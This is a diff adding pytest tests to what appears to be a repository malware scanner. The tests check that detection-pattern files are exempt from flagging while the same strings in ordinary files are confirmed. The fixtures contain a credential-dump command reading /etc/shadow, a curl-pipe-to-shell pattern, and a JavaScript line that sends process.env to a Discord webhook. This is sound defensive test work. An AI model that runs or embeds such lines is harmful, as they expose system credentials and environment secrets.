@@ -279,6 +279,49 @@ def test_vscode_task_per_os_manual_does_not_confirm(tmp_path):
     assert not analyze_repo(tmp_path, "legit/app").confirmed
 
 
+def test_security_scanner_pattern_file_does_not_confirm(tmp_path):
+    # The boredchilada/pkgward-oss FP: a malware SCANNER carries attack strings and
+    # known-bad names in its detection database (analyze/malware_patterns.py). That
+    # is the tool's reference DATA, not a payload it runs, so it must not confirm.
+    analyze = tmp_path / "pkgward" / "analyze"
+    analyze.mkdir(parents=True)
+    (analyze / "malware_patterns.py").write_text(
+        'CRED_DUMP = "cat /etc/shadow"\n'
+        'FETCH_RUN = r"curl\\s+http[^|]*\\|\\s*sh"\n'
+        'ENV_EXFIL = "process.env"\n',
+        encoding="utf-8")
+    assert not analyze_repo(tmp_path, "boredchilada/pkgward-oss").confirmed
+
+
+def test_is_security_data_file_predicate():
+    from pathlib import Path
+
+    from git_warden.scanning.bash_scanner import is_ignored_path, is_security_data_file
+    assert is_security_data_file("malware_patterns.py")
+    assert is_security_data_file("adv_malware_raw.json")
+    assert is_ignored_path(Path("pkgward/analyze/malware_patterns.py"))
+    # Real payload filenames are NOT treated as security data.
+    assert not is_security_data_file("postcss.config.js")
+    assert not is_ignored_path(Path("src/index.js"))
+
+
+def test_security_data_exclusion_is_filename_scoped(tmp_path):
+    # A/B control: the identical steal-and-send payload is reference DATA inside a
+    # scanner's pattern file (excluded, no confirm) but a real PAYLOAD in an
+    # ordinary shipped file (confirms). The exclusion is filename-scoped, not global.
+    payload = (
+        "fetch('https://discord.com/api/webhooks/1/x',"
+        "{method:'POST',body:JSON.stringify(process.env)});\n"
+    )
+    sec = tmp_path / "analyze"
+    sec.mkdir()
+    (sec / "malware_patterns.py").write_text(payload, encoding="utf-8")
+    assert not analyze_repo(tmp_path, "scanner/tool").confirmed   # data in a rule DB
+
+    (tmp_path / "index.ts").write_text(payload, encoding="utf-8")
+    assert analyze_repo(tmp_path, "evil/lib").confirmed           # same string, shipped
+
+
 def test_test_fixture_files_excluded_from_confirmation(tmp_path):
     # The crewhaus FP: a prompt-injection DETECTOR's `index.test.ts` cites
     # webhook.site / telegram as fixtures. Test/fixture data is not the payload.
